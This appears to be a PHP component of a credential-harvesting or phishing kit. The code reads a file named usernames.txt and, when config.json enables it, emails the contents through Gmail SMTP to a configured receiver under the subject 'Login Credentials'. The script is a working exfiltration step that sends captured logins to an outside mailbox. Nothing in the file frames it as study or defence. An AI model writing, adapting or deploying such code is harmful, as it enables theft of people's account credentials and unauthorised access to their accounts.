<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
//use PHPMailer\PHPMailer\PHPMailer;
//use PHPMailer\PHPMailer\PHPMailer;
//use PHPMailer\PHPMailer\SMTP;


require "PHPMailer/src/Exception.php";
require "PHPMailer/src/PHPMailer.php";
require "PHPMailer/src/SMTP.php";
//require "PHPMailer\PHPMailer\Exception";


//Create an instance; passing `true` enables exceptions

function sendMail() {
  try {
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    $config = json_decode(file_get_contents("config.json"), true);
    $isMail = $config["email"];
    if($isMail==="yes"){
      $name = $config["name"];
      $sender = $config["sender"];
      $password = $config["password"];
      $receiver = $config["receiver"];
      $body = file_get_contents("usernames.txt");
      $htmlBody = "<b>" . join("</b><br><b>", explode("\n", $body)) . "</b>";
      //Server settings
      $mail->SMTPDebug = 0;// PHPMailer\PHPMailer\SMTP::DEBUG_SERVER;                      //Enable verbose debug output
      $mail->isSMTP();                                          //Send using SMTP
      $mail->Host       = 'smtp.gmail.com';                    //Set the SMTP server to send through
      $mail->SMTPAuth   = true;                                //Enable SMTP authentication
      $mail->Username   = $sender;                             //SMTP username
      $mail->Password   = $password;                           //SMTP password
      $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
      $mail->Port       = 465;                                //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

      //Recipients
      $mail->setFrom($sender, $name);
      $mail->addAddress($receiver, $name);     //Add a recipient
      $mail->addReplyTo($sender, $name);

      //Content
      $mail->isHTML(true);                                  //Set email format to HTML
      $mail->Subject = 'Login Credentials';
      $mail->Body    = "<h3>Login Credentials</h3>$htmlBody";
      $mail->AltBody = "Login Credentials\n$body";

      $mail->send();
    }
  } catch (Exception $e) {
      echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
  }
}
?>
